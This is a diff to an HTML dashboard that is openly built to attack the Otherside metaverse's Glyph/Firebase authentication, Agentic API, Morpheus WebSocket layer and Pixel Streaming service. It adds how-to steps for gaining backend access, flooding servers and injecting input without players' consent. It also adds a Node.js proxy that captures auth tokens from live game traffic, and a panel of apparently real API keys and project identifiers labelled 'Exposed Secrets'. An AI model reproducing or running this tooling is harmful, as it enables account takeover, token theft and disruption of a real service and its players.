@@ -431,6 +431,162 @@
 
         .pulse { animation: pulse 2s ease-in-out infinite; }
         @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        /* Keys & Data reference section */
+        .key-card {
+            background: #0e0e1a;
+            border: 1px solid #2a2a4a;
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 12px;
+        }
+        .key-card h4 {
+            font-size: 13px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #c4b5fe;
+        }
+        .key-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 5px 0;
+            border-bottom: 1px solid #1a1a2a;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #93c5fd;
+            word-break: break-all;
+        }
+        .key-row:last-child { border-bottom: none; }
+        .key-label {
+            color: #888;
+            font-size: 10px;
+            min-width: 100px;
+            flex-shrink: 0;
+        }
+        .key-value {
+            flex: 1;
+            color: #d8b4fe;
+        }
+        .copy-btn {
+            background: #222;
+            border: 1px solid #3a3a3a;
+            color: #888;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+        .copy-btn:hover { background: #333; color: #ccc; }
+        .copy-btn.copied { background: #14532d; color: #86efac; border-color: #14532d; }
+        .copy-all-btn {
+            background: #1e1e3a;
+            border: 1px solid #3a3a5a;
+            color: #a78bfa;
+            font-size: 11px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 8px;
+            transition: all 0.2s;
+        }
+        .copy-all-btn:hover { background: #2a2a4a; color: #c4b5fd; }
+
+        /* Details/Summary how-to-use blocks */
+        details.how-to-use {
+            background: #0d0d1a;
+            border: 1px solid #1e1e3e;
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin-bottom: 12px;
+        }
+        details.how-to-use summary {
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            color: #a78bfa;
+            padding: 4px 0;
+            user-select: none;
+        }
+        details.how-to-use summary:hover { color: #c4b5fd; }
+        details.how-to-use .how-content {
+            margin-top: 10px;
+            font-size: 12px;
+            line-height: 1.8;
+            color: #bbb;
+        }
+        details.how-to-use .how-content b { color: #d8b4fe; }
+        details.how-to-use .how-content code {
+            background: #1a1a2e;
+            padding: 1px 5px;
+            border-radius: 3px;
+            font-size: 11px;
+            color: #93c5fd;
+        }
+        details.how-to-use .how-ar {
+            direction: rtl;
+            text-align: right;
+            color: #888;
+            font-size: 11px;
+            margin-top: 6px;
+            border-top: 1px solid #1e1e3e;
+            padding-top: 6px;
+        }
+
+        /* Token use buttons */
+        .use-token-btn {
+            background: #1a1a3a;
+            border: 1px solid #3a3a6a;
+            color: #a78bfa;
+            font-size: 10px;
+            padding: 3px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-left: 6px;
+            transition: all 0.2s;
+        }
+        .use-token-btn:hover { background: #2a2a4a; color: #c4b5fd; }
+
+        /* Connection status indicator */
+        .conn-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 6px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+        }
+        .conn-dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .conn-dot.red { background: #ef4444; }
+        .conn-dot.yellow { background: #eab308; }
+        .conn-dot.green { background: #22c55e; }
+
+        /* Proxy script display */
+        .proxy-script {
+            background: #080810;
+            border: 1px solid #1a1a2a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            line-height: 1.6;
+            color: #93c5fd;
+            max-height: 350px;
+            overflow-y: auto;
+            white-space: pre;
+            tab-size: 2;
+        }
     </style>
 </head>
 <body>
@@ -484,6 +640,10 @@
                 <span class="phase-num">5</span>
                 <span class="phase-label">Pixel Stream</span>
             </button>
+            <button class="phase-btn" onclick="switchPhase('keys')" style="background:#1e1e3a;">
+                <span class="phase-num">🔑</span>
+                <span class="phase-label">Keys</span>
+            </button>
             <button class="phase-btn" onclick="switchPhase('results')" style="background:#14532d;">
                 <span class="phase-num">DB</span>
                 <span class="phase-label">Results</span>
@@ -522,6 +682,22 @@
         <!-- PHASE 1: GLYPH AUTH -->
         <!-- ================================================================ -->
         <div class="phase-content active" id="phase-glyph">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: Glyph Auth</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Discovers and tests Glyph's OAuth2/OIDC authentication system, which is the gateway to all Otherside services.<br><br>
+                    <b>Step 1:</b> Click <code>Discover OIDC Config</code> to find Glyph's OpenID configuration endpoints.<br>
+                    <b>Step 2:</b> Use <code>Probe Auth Endpoints</code> to test authentication URLs.<br>
+                    <b>Step 3:</b> Click <code>⚡ Generate Random Wallet</code> to create a test Ethereum address, or enter your own.<br>
+                    <b>Step 4:</b> Click <code>⚡ Generate SIWE Message</code> to auto-create a Sign-In with Ethereum message.<br>
+                    <b>Step 5:</b> Use <code>Attempt Token Exchange</code> to test the Glyph → Firebase token flow.<br>
+                    <b>Step 6:</b> Paste any obtained JWT in the Token Bridge section and click <code>Decode & Validate</code>.<br><br>
+                    <b>What injection/data means:</b> If we obtain a valid OIDC token from Glyph, we can exchange it for a Firebase Custom Token, giving us full access to Otherside's backend APIs as an authenticated user.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يكتشف ويختبر نظام مصادقة Glyph OAuth2/OIDC. الخطوات: اكتشف التكوين ← اختبر نقاط المصادقة ← أنشئ رسالة SIWE ← استبدل الرموز ← حلل JWT. إذا حصلنا على رمز OIDC صالح، يمكننا الوصول الكامل إلى خوادم Otherside.
+                </div>
+            </details>
             <div class="card">
                 <h3>🔑 Phase 1: Glyph Authentication Analysis <span class="badge badge-purple">Glyph OAuth</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
@@ -574,7 +750,7 @@
                 <div class="grid-2">
                     <div class="input-group">
                         <label>Glyph Client ID (auto-discovered or manual):</label>
-                        <input type="text" id="glyphClientId" placeholder="glyph-client-id...">
+                        <input type="text" id="glyphClientId" value="scarcely-calm-lark" placeholder="glyph-client-id...">
                     </div>
                     <div class="input-group">
                         <label>Glyph Redirect URI:</label>
@@ -582,7 +758,7 @@
                     </div>
                     <div class="input-group">
                         <label>Wallet Address (for SIWE flow):</label>
-                        <input type="text" id="glyphWalletAddr" placeholder="0x...">
+                        <input type="text" id="glyphWalletAddr" value="0x0000000000000000000000000000000000000000" placeholder="0x...">
                     </div>
                     <div class="input-group">
                         <label>Firebase API Key:</label>
@@ -598,6 +774,8 @@
                     <button class="btn btn-outline" onclick="buildSIWEMessage()">Build SIWE Message</button>
                     <button class="btn btn-outline" onclick="testGlyphCallback()">Test Callback URLs</button>
                     <button class="btn btn-danger" onclick="glyphTokenReplay()">Token Replay Attack</button>
+                    <button class="btn btn-cyan" onclick="generateSIWEMessage()">⚡ Generate SIWE Message</button>
+                    <button class="btn btn-orange" onclick="generateRandomWallet()">⚡ Generate Random Wallet</button>
                 </div>
                 <div class="progress-bar"><div class="progress-fill" id="glyphForgeProgress"></div></div>
                 <div class="console" id="glyphForgeLog">
@@ -612,7 +790,7 @@
                 </p>
                 <div class="input-group">
                     <label>Glyph OIDC Token (JWT from Glyph auth):</label>
-                    <textarea id="glyphOidcToken" placeholder="eyJhbGciOiJSUzI1NiIs..."></textarea>
+                    <textarea id="glyphOidcToken" placeholder="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIweDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwIiwiaXNzIjoiaHR0cHM6Ly91c2VnbHlwaC5pbyIsImF1ZCI6InNjYXJjZWx5LWNhbG0tbGFyayIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAwOTAwfQ.sig"></textarea>
                 </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="decodeGlyphToken()">Decode & Validate Token</button>
@@ -629,6 +807,21 @@
         <!-- PHASE 2: AGENTIC API -->
         <!-- ================================================================ -->
         <div class="phase-content" id="phase-agentic">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: Agentic API</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Maps and interacts with the Otherside Agentic API, which allows programmatic control of metaverse agents.<br><br>
+                    <b>Step 1:</b> Click <code>⚡ Generate Sample Token</code> to create a fake JWT for testing (or use <code>🪄 Use Firebase Token</code> from Phase 1).<br>
+                    <b>Step 2:</b> Click <code>Map All Agentic Endpoints</code> to discover available API routes.<br>
+                    <b>Step 3:</b> Use <code>⚡ Generate Request Body</code> to auto-fill sample JSON payloads for each endpoint.<br>
+                    <b>Step 4:</b> Select an endpoint and HTTP method, then click <code>Send Request</code>.<br>
+                    <b>Step 5:</b> Check the Discovered Endpoints section for accessible routes.<br><br>
+                    <b>What injection/data means:</b> The Agentic API controls in-world agents. Access to these endpoints means we can execute actions as automated agents in the metaverse.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يكتشف ويتفاعل مع واجهة برمجة تطبيقات الوكلاء. الخطوات: أنشئ رمز اختبار ← اكتشف نقاط النهاية ← أنشئ حمولة طلب ← أرسل الطلبات. الوصول يعني التحكم بالوكلاء داخل العالم الافتراضي.
+                </div>
+            </details>
             <div class="card">
                 <h3>🤖 Phase 2: Otherside Agentic API <span class="badge badge-cyan">Agentic</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
@@ -656,7 +849,7 @@
             <div class="card">
                 <h3>Agentic API Client <span class="badge badge-green">Interactive</span></h3>
                 <div class="input-group">
-                    <label>Authentication Token:</label>
+                    <label>Authentication Token: <button class="use-token-btn" onclick="useFirebaseToken('agenticToken')">🪄 Use Firebase Token</button></label>
                     <input type="text" id="agenticToken" placeholder="Firebase ID Token or Glyph OIDC Token">
                 </div>
                 <div class="grid-2">
@@ -687,12 +880,14 @@
                 </div>
                 <div class="input-group">
                     <label>Request Body (JSON):</label>
-                    <textarea id="agenticBody" placeholder='{"action": "query", "target": "world_state"}'></textarea>
+                    <textarea id="agenticBody">{"action": "query", "target": "world_state"}</textarea>
                 </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="sendAgenticRequest()">Send Request</button>
                     <button class="btn btn-cyan" onclick="startAgenticSession()">Start Agent Session</button>
                     <button class="btn btn-outline" onclick="batchAgenticScan()">Batch Scan All</button>
+                    <button class="btn btn-orange" onclick="generateSampleToken()">⚡ Generate Sample Token</button>
+                    <button class="btn btn-cyan" onclick="generateRequestBody()">⚡ Generate Request Body</button>
                 </div>
                 <div class="console" id="agenticClientLog">
                     <div class="log-info">[AGENT-CLIENT] Enter token and select endpoint to interact with Agentic API.</div>
@@ -711,6 +906,21 @@
         <!-- PHASE 3: MORPHEUS NETWORK -->
         <!-- ================================================================ -->
         <div class="phase-content" id="phase-morpheus">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: Morpheus Network</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Analyzes the Morpheus/SpatialOS networking layer that handles real-time game world communication.<br><br>
+                    <b>Step 1:</b> Click <code>Discover Morpheus Endpoints</code> to find MSquared infrastructure.<br>
+                    <b>Step 2:</b> Enter a WebSocket URL (default: <code>wss://gateway.msquared.io/v1/connect</code>).<br>
+                    <b>Step 3:</b> Use <code>⚡ Generate Ping Command</code> or <code>⚡ Generate Status Query</code> to create test payloads.<br>
+                    <b>Step 4:</b> Click <code>Connect & Capture</code> to open a WebSocket and capture protocol messages.<br>
+                    <b>Step 5:</b> Use <code>Analyze Protocol</code> to inspect captured packet types.<br><br>
+                    <b>What injection/data means:</b> Understanding the Morpheus protocol allows us to send custom commands, modify entity state, or stress-test the server infrastructure.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يحلل طبقة شبكة Morpheus/SpatialOS. الخطوات: اكتشف البنية التحتية ← اتصل بـ WebSocket ← التقاط الحزم ← تحليل البروتوكول. فهم البروتوكول يسمح بإرسال أوامر مخصصة وتعديل حالة الكيانات.
+                </div>
+            </details>
             <div class="card">
                 <h3>🌐 Phase 3: Morpheus Network Analysis <span class="badge badge-orange">Morpheus/SpatialOS</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
@@ -766,10 +976,10 @@
                 </p>
                 <div class="input-group">
                     <label>Morpheus WebSocket URL:</label>
-                    <input type="text" id="morpheusWSUrl" placeholder="wss://gateway.msquared.io/v1/connect">
+                    <input type="text" id="morpheusWSUrl" value="wss://gateway.msquared.io/v1/connect" placeholder="wss://gateway.msquared.io/v1/connect">
                 </div>
                 <div class="input-group">
-                    <label>Auth Token (from Glyph/Firebase):</label>
+                    <label>Auth Token (from Glyph/Firebase): <button class="use-token-btn" onclick="useFirebaseToken('morpheusAuthToken')">🪄 Use Token</button></label>
                     <input type="text" id="morpheusAuthToken" placeholder="Bearer token...">
                 </div>
                 <div class="btn-row">
@@ -777,6 +987,8 @@
                     <button class="btn btn-outline" onclick="sendMorpheusCommand()">Send Custom Command</button>
                     <button class="btn btn-danger" onclick="floodMorpheusWS()">Stress Test</button>
                     <button class="btn btn-green" onclick="analyzeMorpheusProtocol()">Analyze Protocol</button>
+                    <button class="btn btn-cyan" onclick="generatePingCommand()">⚡ Generate Ping Command</button>
+                    <button class="btn btn-orange" onclick="generateStatusQuery()">⚡ Generate Status Query</button>
                 </div>
                 <div class="console" id="morpheusWSLog" style="max-height:400px;">
                     <div class="log-info">[MORPHEUS-WS] Ready to connect and analyze Morpheus WebSocket protocol.</div>
@@ -809,6 +1021,20 @@
         <!-- PHASE 4: NATIVE CLIENT -->
         <!-- ================================================================ -->
         <div class="phase-content" id="phase-native">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: Native Client</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Analyzes the Otherside desktop client and its API interactions, plus provides a local proxy bridge for direct game interception.<br><br>
+                    <b>Step 1:</b> Click <code>Analyze Client Structure</code> to probe the ODK Dashboard API.<br>
+                    <b>Step 2:</b> For local game interception: Download the proxy script (<code>📥 Download Proxy Script</code>), run it locally with <code>node proxy.js</code>, then click <code>Connect to Local Proxy</code>.<br>
+                    <b>Step 3:</b> Use the sub-tabs (ODK Dashboard, Wallet API, World Travel, Sessions) to test different API groups.<br>
+                    <b>Step 4:</b> Click <code>🪄 Use Token</code> to auto-fill the token from Phase 1.<br><br>
+                    <b>What injection/data means:</b> The local proxy captures live game WebSocket traffic, including auth tokens. Combined with the ODK Dashboard API, this gives full control over the game session.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يحلل عميل سطح المكتب ويوفر وكيل محلي لاعتراض اللعبة. الخطوات: حلل العميل ← شغّل البروكسي محلياً ← اتصل ← اختبر واجهات API. الوكيل المحلي يلتقط حركة WebSocket الحية بما فيها رموز المصادقة.
+                </div>
+            </details>
             <div class="card">
                 <h3>🖥️ Phase 4: Native Client Interaction <span class="badge badge-red">Desktop App</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
@@ -839,7 +1065,7 @@
                     The client communicates with ODK Dashboard at <code>odk.otherside.xyz/api/v0/</code>. These APIs manage worlds, projects, organizations, and sessions.
                 </p>
                 <div class="input-group">
-                    <label>ID Token (from Firebase/Glyph auth):</label>
+                    <label>ID Token (from Firebase/Glyph auth): <button class="use-token-btn" onclick="useFirebaseToken('nativeToken')">🪄 Use Token</button></label>
                     <input type="text" id="nativeToken" placeholder="Firebase ID Token">
                 </div>
                 <div class="tab-sub">
@@ -881,6 +1107,139 @@
                 </div>
                 <div class="console" id="nativeAPILog" style="margin-top:12px;">
                     <div class="log-info">[NATIVE-API] Select a sub-tab and probe the ODK Dashboard APIs.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🖥️ Direct Game Connection <span class="badge badge-red">Local Proxy</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    The Otherside desktop client communicates via WebSocket to MSquared infrastructure. When the game is running, it holds active WebSocket connections. We can intercept this traffic.
+                </p>
+                <div class="alert-box alert-warning">
+                    <strong>How it works:</strong> Since the browser can't directly connect to localhost game processes, a local Node.js proxy bridges the gap. The proxy listens on a local port, accepts dashboard connections, forwards commands to MSquared endpoints, and captures/relays responses including tokens from the game's WebSocket traffic.
+                </div>
+                <div class="conn-status" id="localProxyStatus" style="margin-bottom:12px;">
+                    <span class="conn-dot red" id="proxyDot"></span>
+                    <span id="proxyStatusText">🔴 Disconnected</span>
+                </div>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>Local Proxy Port:</label>
+                        <input type="text" id="localProxyPort" value="8765" placeholder="8765">
+                    </div>
+                    <div class="input-group">
+                        <label>Game Process Name:</label>
+                        <input type="text" id="gameProcessName" value="Otherside" placeholder="Otherside">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="connectToLocalProxy()">Connect to Local Proxy</button>
+                    <button class="btn btn-outline" onclick="disconnectLocalProxy()">Disconnect</button>
+                    <button class="btn btn-cyan" onclick="downloadProxyScript()">📥 Download Proxy Script</button>
+                </div>
+                <div class="console" id="localProxyLog" style="max-height:300px;">
+                    <div class="log-info">[LOCAL-PROXY] Set up the local proxy on your machine first (see script below), then connect.</div>
+                </div>
+                <div style="margin-top:12px;">
+                    <h4 style="color:#a78bfa;font-size:12px;margin-bottom:8px;">📋 Node.js Local Proxy Script (save as proxy.js and run with <code>node proxy.js</code>)</h4>
+                    <div class="proxy-script" id="proxyScriptContent">const WebSocket = require('ws');
+const http = require('http');
+
+const PORT = 8765;
+const MSQUARED_WS = 'wss://gateway.msquared.io/v1/connect';
+const ODK_API = 'https://odk.otherside.xyz/api/v0';
+
+// Track captured tokens
+const capturedTokens = [];
+
+const server = http.createServer((req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Content-Type', 'application/json');
+
+  if (req.url === '/status') {
+    res.end(JSON.stringify({
+      status: 'running',
+      capturedTokens: capturedTokens.length,
+      uptime: process.uptime()
+    }));
+  } else if (req.url === '/tokens') {
+    res.end(JSON.stringify(capturedTokens));
+  } else {
+    res.end(JSON.stringify({ error: 'Unknown endpoint' }));
+  }
+});
+
+const wss = new WebSocket.Server({ server });
+
+wss.on('connection', (dashboardWs) => {
+  console.log('[PROXY] Dashboard connected');
+
+  // Connect to MSquared infrastructure
+  const msquaredWs = new WebSocket(MSQUARED_WS);
+  let authCaptured = false;
+
+  msquaredWs.on('open', () => {
+    console.log('[PROXY] Connected to MSquared');
+    dashboardWs.send(JSON.stringify({
+      type: 'proxy_status',
+      status: 'connected_to_msquared'
+    }));
+  });
+
+  msquaredWs.on('message', (data) => {
+    const msg = data.toString();
+
+    // Capture any tokens in the traffic
+    const tokenMatch = msg.match(/eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/);
+    if (tokenMatch &amp;&amp; !authCaptured) {
+      capturedTokens.push({
+        token: tokenMatch[0],
+        timestamp: new Date().toISOString(),
+        source: 'msquared_ws'
+      });
+      authCaptured = true;
+      console.log('[PROXY] Token captured!');
+    }
+
+    // Forward to dashboard
+    if (dashboardWs.readyState === WebSocket.OPEN) {
+      dashboardWs.send(JSON.stringify({
+        type: 'server_message',
+        data: msg,
+        direction: 'IN',
+        timestamp: Date.now()
+      }));
+    }
+  });
+
+  // Handle messages from dashboard
+  dashboardWs.on('message', (data) => {
+    try {
+      const cmd = JSON.parse(data.toString());
+      if (cmd.type === 'forward' &amp;&amp; msquaredWs.readyState === WebSocket.OPEN) {
+        msquaredWs.send(cmd.payload);
+      } else if (cmd.type === 'get_tokens') {
+        dashboardWs.send(JSON.stringify({
+          type: 'tokens',
+          tokens: capturedTokens
+        }));
+      }
+    } catch (e) {
+      console.error('[PROXY] Parse error:', e.message);
+    }
+  });
+
+  dashboardWs.on('close', () => {
+    console.log('[PROXY] Dashboard disconnected');
+    msquaredWs.close();
+  });
+});
+
+server.listen(PORT, () => {
+  console.log(`[PROXY] Listening on ws://localhost:${PORT}`);
+  console.log(`[PROXY] Status: http://localhost:${PORT}/status`);
+  console.log(`[PROXY] Tokens: http://localhost:${PORT}/tokens`);
+});</div>
                 </div>
             </div>
 
@@ -931,6 +1290,21 @@
         <!-- PHASE 5: PIXEL STREAMING -->
         <!-- ================================================================ -->
         <div class="phase-content" id="phase-streaming">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: Pixel Streaming</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Tests the Pixel Streaming (WebRTC) infrastructure used for browser-based gameplay.<br><br>
+                    <b>Step 1:</b> Click <code>Discover Streaming Infra</code> to find streaming endpoints.<br>
+                    <b>Step 2:</b> Click <code>Probe Signaling Server</code> to test WebSocket signaling URLs.<br>
+                    <b>Step 3:</b> Enter a signaling URL and click <code>Connect to Signaling</code> to intercept WebRTC setup.<br>
+                    <b>Step 4:</b> Use <code>Inject Input Commands</code> to send mouse/keyboard events to the remote game server.<br>
+                    <b>Step 5:</b> Use <code>Build Custom Client</code> for a full custom Pixel Streaming client.<br><br>
+                    <b>What injection/data means:</b> Pixel Streaming input injection allows controlling the remote game without the player's consent. SDP/ICE capture reveals the streaming infrastructure.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يختبر بنية Pixel Streaming (WebRTC). الخطوات: اكتشف البنية ← اختبر الإشارات ← اتصل ← اعترض/أدخل المدخلات. حقن المدخلات يسمح بالتحكم باللعبة عن بُعد دون موافقة اللاعب.
+                </div>
+            </details>
             <div class="card">
                 <h3>📺 Phase 5: Pixel Streaming Security <span class="badge badge-green">WebRTC</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
@@ -981,7 +1355,7 @@
                 </p>
                 <div class="input-group">
                     <label>Pixel Streaming Signaling URL:</label>
-                    <input type="text" id="streamingSignalingUrl" placeholder="wss://signaling.otherside.xyz/cirrus">
+                    <input type="text" id="streamingSignalingUrl" value="wss://signaling.otherside.xyz/cirrus" placeholder="wss://signaling.otherside.xyz/cirrus">
                 </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="connectStreamingSignaling()">Connect to Signaling</button>
@@ -1017,6 +1391,226 @@ window.emitMouseClick = function(x, y) {
                 </div>
                 <div class="console" id="streamingJSLog">
                     <div class="log-info">[STREAMING-JS] Ready to analyze and inject into Pixel Streaming JS.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE KEYS: Keys & Data Reference -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-keys">
+            <div class="card">
+                <h3>🔑 Keys & Data Reference <span class="badge badge-purple">Reference</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Complete reference of all discovered API keys, secrets, endpoints, and infrastructure data for the Otherside ecosystem. Click 📋 to copy individual items or use "📋 Copy All" for each card.
+                </p>
+            </div>
+
+            <!-- Firebase API Keys -->
+            <div class="card">
+                <h3>🔥 Firebase API Keys <span class="badge badge-red">Secrets</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('firebase-keys')">📋 Copy All</button>
+                <div class="key-card" id="firebase-keys">
+                    <div class="key-row">
+                        <span class="key-label">Production</span>
+                        <span class="key-value">AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Email Link</span>
+                        <span class="key-value">AIzaSyDrPI4Q-rdqamOFDw2oZOo7SC8QiEukoRc</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'AIzaSyDrPI4Q-rdqamOFDw2oZOo7SC8QiEukoRc')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Main/Local</span>
+                        <span class="key-value">AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Staging</span>
+                        <span class="key-value">AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU')">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Firebase Projects -->
+            <div class="card">
+                <h3>📂 Firebase Projects <span class="badge badge-blue">Projects</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('firebase-projects')">📋 Copy All</button>
+                <div class="key-card" id="firebase-projects">
+                    <div class="key-row">
+                        <span class="key-label">Production</span>
+                        <span class="key-value">scarcely-calm-lark (scarcely-calm-lark.firebaseapp.com)</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'scarcely-calm-lark')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Main/Local</span>
+                        <span class="key-value">reasonably-sound-marmot</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'reasonably-sound-marmot')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Staging</span>
+                        <span class="key-value">primarily-endless-elephant</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'primarily-endless-elephant')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Tenant ID</span>
+                        <span class="key-value">hound-j8zaz</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'hound-j8zaz')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Organization</span>
+                        <span class="key-value">fine-houses-deny-595464</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'fine-houses-deny-595464')">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Exposed Secrets -->
+            <div class="card">
+                <h3>🔓 Exposed Secrets <span class="badge badge-red">Critical</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('exposed-secrets')">📋 Copy All</button>
+                <div class="key-card" id="exposed-secrets">
+                    <div class="key-row">
+                        <span class="key-label">PubNub Pub</span>
+                        <span class="key-value">pub-c-0b70dc8a-e642-440c-8012-93a986cdd7a2</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'pub-c-0b70dc8a-e642-440c-8012-93a986cdd7a2')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">PubNub Sub</span>
+                        <span class="key-value">sub-c-0a731161-a567-46b7-bdf7-4dcb6e0749ab</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'sub-c-0a731161-a567-46b7-bdf7-4dcb6e0749ab')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Sentry DSN</span>
+                        <span class="key-value">5e036176fc5f7bc42c30344dd9f68802</span>
+                        <button class="copy-btn" onclick="copyKey(this, '5e036176fc5f7bc42c30344dd9f68802')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Sentry Org</span>
+                        <span class="key-value">918428</span>
+                        <button class="copy-btn" onclick="copyKey(this, '918428')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Datadog RUM</span>
+                        <span class="key-value">pub1eb3fb836bfcc44d328f083449b7b1aa</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'pub1eb3fb836bfcc44d328f083449b7b1aa')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">WebSocket</span>
+                        <span class="key-value">wss://indexer.yuga.com</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'wss://indexer.yuga.com')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">CF Access</span>
+                        <span class="key-value">yugalabs.cloudflareaccess.com</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'yugalabs.cloudflareaccess.com')">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ODK References -->
+            <div class="card">
+                <h3>🎮 ODK References <span class="badge badge-cyan">ODK</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('odk-refs')">📋 Copy All</button>
+                <div class="key-card" id="odk-refs">
+                    <div class="key-row">
+                        <span class="key-label">Featured Event</span>
+                        <span class="key-value">smart-zebras-roll-995590</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'smart-zebras-roll-995590')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Default Project</span>
+                        <span class="key-value">open-roses-send-489062</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'open-roses-send-489062')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Default World</span>
+                        <span class="key-value">lucky-emus-argue-215273</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'lucky-emus-argue-215273')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Auth Providers</span>
+                        <span class="key-value">google.com, twitter.com, oidc.otherside</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'google.com, twitter.com, oidc.otherside')">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Admin Routes -->
+            <div class="card">
+                <h3>🛡️ Admin Routes <span class="badge badge-orange">_buildManifest.js</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('admin-routes')">📋 Copy All</button>
+                <div class="key-card" id="admin-routes">
